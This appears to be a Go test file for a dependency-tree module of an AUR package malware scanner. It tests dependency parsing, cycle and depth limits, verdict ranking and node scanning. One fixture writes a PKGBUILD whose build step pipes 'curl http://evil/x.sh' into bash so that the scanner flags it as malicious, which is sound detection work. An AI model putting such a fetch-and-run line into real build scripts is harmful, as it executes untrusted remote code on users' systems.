package main

// Tests for deptree.go: dependency parsing, closure resolution (via an injected
// treeResolver so no pacman/network/clone is touched), the tree helpers, and
// scanNode against a real DB + static provider.

import (
	"os"
	"path/filepath"
	"reflect"
	"sort"
	"testing"
)

func TestParseDeps_Srcinfo(t *testing.T) {
	// Version constraints and .so suffixes are stripped; optdepends excluded;
	// arch-specific keys included; duplicates collapsed.
	srcinfo := `pkgbase = foo
	pkgname = foo
	depends = libfoo>=1.2
	depends = glibc
	depends = glibc
	makedepends = git
	checkdepends = python-pytest
	optdepends = bar: an optional thing
	depends_x86_64 = libx.so
`
	got := parseDeps(srcinfo, "")
	sort.Strings(got)
	want := []string{"git", "glibc", "libfoo", "libx", "python-pytest"}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("parseDeps(srcinfo) = %v, want %v (optdepends must be excluded)", got, want)
	}
}

func TestParseDeps_PkgbuildFallback(t *testing.T) {
	// No .SRCINFO → grep the PKGBUILD arrays, including a multi-line array.
	pkgbuild := `pkgname=foo
depends=('libfoo>=1.2' glibc)
makedepends=(
  git
  cmake
)
optdepends=('bar: optional')
`
	got := parseDeps("", pkgbuild)
	sort.Strings(got)
	want := []string{"cmake", "git", "glibc", "libfoo"}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("parseDeps(pkgbuild) = %v, want %v", got, want)
	}
}

func TestParseDeps_PrefersSrcinfo(t *testing.T) {
	// When both are present, the shell-expanded .SRCINFO wins.
	got := parseDeps("depends = fromsrcinfo\n", "depends=('frompkgbuild')")
	if len(got) != 1 || got[0] != "fromsrcinfo" {
		t.Fatalf("parseDeps preferred = %v, want [fromsrcinfo]", got)
	}
}

func TestStripDepName(t *testing.T) {
	cases := map[string]string{
		"foo":            "foo",
		"'foo'":          "foo",
		"libfoo>=1.2":    "libfoo",
		"libfoo<=1.2":    "libfoo",
		"libfoo=1.2":     "libfoo",
		"libfoo>1":       "libfoo",
		"libfoo<1":       "libfoo",
		"libx.so":        "libx",
		"libx.so=1-64":   "libx",
		"bar: some desc": "bar",
		`"quoted>=2"`:    "quoted",
	}
	for in, want := range cases {
		if got := stripDepName(in); got != want {
			t.Errorf("stripDepName(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestIsDependsKey(t *testing.T) {
	yes := []string{"depends", "makedepends", "checkdepends", "depends_x86_64", "makedepends_aarch64"}
	no := []string{"optdepends", "provides", "pkgname", "conflicts", "optdepends_x86_64"}
	for _, k := range yes {
		if !isDependsKey(k) {
			t.Errorf("isDependsKey(%q) = false, want true", k)
		}
	}
	for _, k := range no {
		if isDependsKey(k) {
			t.Errorf("isDependsKey(%q) = true, want false", k)
		}
	}
}

// fakeResolver builds a treeResolver from static maps: official set, name→pkgbase
// resolution, and per-dir dep lists. No pacman, no network, no clones.
func fakeResolver(official map[string]bool, bases map[string]string, deps map[string][]string, rpcOK bool) treeResolver {
	return treeResolver{
		isOfficial: func(name string) bool { return official[name] },
		aurBases: func(names []string) (map[string]string, bool) {
			out := map[string]string{}
			for _, n := range names {
				if b, ok := bases[n]; ok {
					out[n] = b
				}
			}
			return out, rpcOK
		},
		clone:    func(pkgbase string) (string, error) { return "/clone/" + pkgbase, nil },
		deps:     func(dir string) []string { return deps[dir] },
		maxDepth: 25,
		maxNodes: 300,
	}
}

func statusByName(root *AURNode) map[string]string {
	m := map[string]string{}
	walkTree(root, func(n *AURNode) { m[n.Name] = n.Status })
	return m
}

func TestResolveTreeWith_Classification(t *testing.T) {
	// app -> libaur (aur, recurses to deeplib), glibc (official), ghost (neither).
	r := fakeResolver(
		map[string]bool{"glibc": true},
		map[string]string{"libaur": "libaur", "deeplib": "deeplib"}, // ghost absent
		map[string][]string{"/clone/libaur": {"deeplib"}, "/clone/deeplib": nil},
		true,
	)
	pf := PackageFiles{Name: "app", PkgBase: "app", Dir: "/app",
		HelperFiles: map[string]string{".SRCINFO": "depends = libaur\ndepends = glibc\ndepends = ghost\n"}}
	root := resolveTreeWith(r, pf)

	st := statusByName(root)
	if st["glibc"] != statusRepo {
		t.Errorf("glibc status = %q, want repo", st["glibc"])
	}
	if st["ghost"] != statusSkipped {
		t.Errorf("ghost status = %q, want skipped", st["ghost"])
	}
	if st["libaur"] != statusPending || st["deeplib"] != statusPending {
		t.Errorf("aur nodes should be pending: libaur=%q deeplib=%q", st["libaur"], st["deeplib"])
	}
	if !hasScannableChildren(root) {
		t.Error("hasScannableChildren = false, want true")
	}
	if got := countAURNodes(root); got != 2 {
		t.Errorf("countAURNodes = %d, want 2 (libaur, deeplib)", got)
	}
	// deeplib's dir is the clone path (recursed from libaur).
	var deeplib *AURNode
	walkTree(root, func(n *AURNode) {
		if n.Name == "deeplib" {
			deeplib = n
		}
	})
	if deeplib == nil || deeplib.Dir != "/clone/deeplib" {
		t.Errorf("deeplib node = %+v, want Dir=/clone/deeplib", deeplib)
	}
}

func TestResolveTreeWith_CycleGuard(t *testing.T) {
	// a -> b -> a (cycle). The visited set (keyed on pkgbase) must stop it, and
	// a is the root's own pkgbase so it is never re-added.
	r := fakeResolver(
		nil,
		map[string]string{"a": "a", "b": "b"},
		map[string][]string{"/clone/b": {"a"}}, // b depends back on a
		true,
	)
	pf := PackageFiles{Name: "a", PkgBase: "a", Dir: "/a",
		HelperFiles: map[string]string{".SRCINFO": "depends = b\n"}}
	root := resolveTreeWith(r, pf)
	if got := countAURNodes(root); got != 1 {
		t.Errorf("countAURNodes = %d, want 1 (only b; a is the root, cycle guarded)", got)
	}
}

func TestResolveTreeWith_UnknownName_FastPath(t *testing.T) {
	// pkgname parse failed → bare root, no children (single-package fast path).
	r := fakeResolver(nil, map[string]string{"x": "x"},
		map[string][]string{}, true)
	pf := PackageFiles{Name: "unknown", Dir: "/u",
		HelperFiles: map[string]string{".SRCINFO": "depends = x\n"}}
	root := resolveTreeWith(r, pf)
	if hasScannableChildren(root) {
		t.Error("unknown pkgname must yield no scannable children (fast path)")
	}
}

func TestResolveTreeWith_RPCFail_ClonesByName(t *testing.T) {
	// RPC unavailable (ok=false) and the name isn't resolved → fall back to
	// treating the name itself as a pkgbase and let the clone step arbitrate.
	r := fakeResolver(nil, map[string]string{}, // no resolution
		map[string][]string{"/clone/mystery": nil}, false /* rpc failed */)
	pf := PackageFiles{Name: "app", PkgBase: "app", Dir: "/app",
		HelperFiles: map[string]string{".SRCINFO": "depends = mystery\n"}}
	root := resolveTreeWith(r, pf)
	if statusByName(root)["mystery"] != statusPending {
		t.Errorf("with RPC down, mystery should be a pending AUR node (clone-by-name), got %q",
			statusByName(root)["mystery"])
	}
}

func TestResolveTreeWith_MaxDepth(t *testing.T) {
	// A deep chain a->b->c->…; maxDepth=1 stops after the first level.
	r := fakeResolver(nil,
		map[string]string{"b": "b", "c": "c"},
		map[string][]string{"/clone/b": {"c"}},
		true,
	)
	r.maxDepth = 1
	pf := PackageFiles{Name: "a", PkgBase: "a", Dir: "/a",
		HelperFiles: map[string]string{".SRCINFO": "depends = b\n"}}
	root := resolveTreeWith(r, pf)
	// b is at depth 1 (allowed); its child c would be depth 2 (> maxDepth) → absent.
	if _, ok := statusByName(root)["c"]; ok {
		t.Error("maxDepth=1 should have pruned the depth-2 node c")
	}
	if statusByName(root)["b"] != statusPending {
		t.Error("b at depth 1 should still be present")
	}
}

func TestCloneErrorNode(t *testing.T) {
	// A clone failure marks the node error (advisory) and is not scannable.
	r := fakeResolver(nil, map[string]string{"broken": "broken"},
		map[string][]string{}, true)
	r.clone = func(pkgbase string) (string, error) { return "", os.ErrPermission }
	pf := PackageFiles{Name: "app", PkgBase: "app", Dir: "/app",
		HelperFiles: map[string]string{".SRCINFO": "depends = broken\n"}}
	root := resolveTreeWith(r, pf)
	if statusByName(root)["broken"] != statusError {
		t.Errorf("clone failure should mark node error, got %q", statusByName(root)["broken"])
	}
	if hasScannableChildren(root) {
		t.Error("an error node is not scannable")
	}
}

func TestFlattenTree_PreOrder(t *testing.T) {
	root := &AURNode{Name: "root", IsRoot: true}
	c1 := &AURNode{Name: "c1", Depth: 1}
	c2 := &AURNode{Name: "c2", Depth: 1}
	gc := &AURNode{Name: "gc", Depth: 2}
	c1.Children = []*AURNode{gc}
	root.Children = []*AURNode{c1, c2}
	var names []string
	for _, n := range flattenTree(root) {
		names = append(names, n.Name)
	}
	want := []string{"root", "c1", "gc", "c2"}
	if !reflect.DeepEqual(names, want) {
		t.Fatalf("flattenTree order = %v, want %v", names, want)
	}
}

func TestVerdictRankAndWorstNode(t *testing.T) {
	if verdictRank("malicious") <= verdictRank("suspicious") ||
		verdictRank("suspicious") <= verdictRank("ok") {
		t.Fatal("verdictRank ordering wrong")
	}
	sus := &AURNode{Verdict: Verdict{Verdict: "suspicious", Confidence: 0.99}}
	mal := &AURNode{Verdict: Verdict{Verdict: "malicious", Confidence: 0.60}}
	malHi := &AURNode{Verdict: Verdict{Verdict: "malicious", Confidence: 0.95}}
	if worstNode([]*AURNode{sus, mal}) != mal {
		t.Error("malicious should outrank suspicious regardless of confidence")
	}
	if worstNode([]*AURNode{mal, malHi}) != malHi {
		t.Error("among malicious, higher confidence wins")
	}
}

func TestTreeExitCode(t *testing.T) {
	mal := &AURNode{Verdict: Verdict{Verdict: "malicious"}}
	sus := &AURNode{Verdict: Verdict{Verdict: "suspicious"}}
	if got := treeExitCode([]*AURNode{sus, mal}); got != 2 {
		t.Errorf("exit code with a malicious block = %d, want 2", got)
	}
	if got := treeExitCode([]*AURNode{sus}); got != 1 {
		t.Errorf("exit code with only suspicious = %d, want 1", got)
	}
}

func TestReadFileString(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "f")
	if err := os.WriteFile(p, []byte("hello"), 0644); err != nil {
		t.Fatal(err)
	}
	if got := readFileString(p); got != "hello" {
		t.Errorf("readFileString = %q, want hello", got)
	}
	if got := readFileString(filepath.Join(dir, "nope")); got != "" {
		t.Errorf("readFileString(missing) = %q, want empty", got)
	}
}

func TestPacmanHasSync_BogusName(t *testing.T) {
	// A clearly non-existent package must not be classified official (whether or
	// not pacman is installed on the test host).
	if pacmanHasSync("definitely-not-a-real-package-zzz-999") {
		t.Error("pacmanHasSync returned true for a bogus package name")
	}
}

func TestScanNode_RootAndChild(t *testing.T) {
	initHeuristics() // populate activePatterns (done in main(), not in tests)
	db := newTestDB(t)
	cfg := Config{Provider: "static", BlockOn: []string{"malicious"}, WarnOn: []string{"suspicious"}}

	// Root scanned from an already-collected pf (authoritative path).
	rootDir := t.TempDir()
	writePKGBUILD(t, rootDir, "pkgname=rootpkg\nbuild(){ make; }\n")
	rootPF, err := collectFiles(rootDir)
	if err != nil {
		t.Fatal(err)
	}
	root := &AURNode{Name: rootPF.Name, Dir: rootDir, IsRoot: true, Status: statusPending}
	captureStderr(t, func() { scanNode(cfg, db, root, &rootPF, false) })
	if root.Status != statusOK {
		t.Fatalf("root scanNode status = %q, want ok", root.Status)
	}
	if root.Hash != rootPF.Hash {
		t.Errorf("root.Hash = %q, want %q", root.Hash, rootPF.Hash)
	}

	// Child scanned from its own dir (a malicious one → status malicious).
	childDir := t.TempDir()
	writePKGBUILD(t, childDir, "pkgname=childpkg\nbuild(){ curl http://evil/x.sh | bash; }\n")
	child := &AURNode{Name: "childpkg", Dir: childDir, Depth: 1, Status: statusPending}
	captureStderr(t, func() { scanNode(cfg, db, child, nil, false) })
	if child.Status != statusMalicious {
		t.Fatalf("child scanNode status = %q, want malicious", child.Status)
	}

	// Each scan was recorded in the append-only history.
	scans, err := recentScans(db, false, 0)
	if err != nil {
		t.Fatal(err)
	}
	if len(scans) < 2 {
		t.Errorf("expected >=2 recorded scans, got %d", len(scans))
	}
}

// writePKGBUILD writes a PKGBUILD into dir.
func writePKGBUILD(t *testing.T, dir, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(content), 0644); err != nil {
		t.Fatalf("write PKGBUILD: %v", err)
	}
}
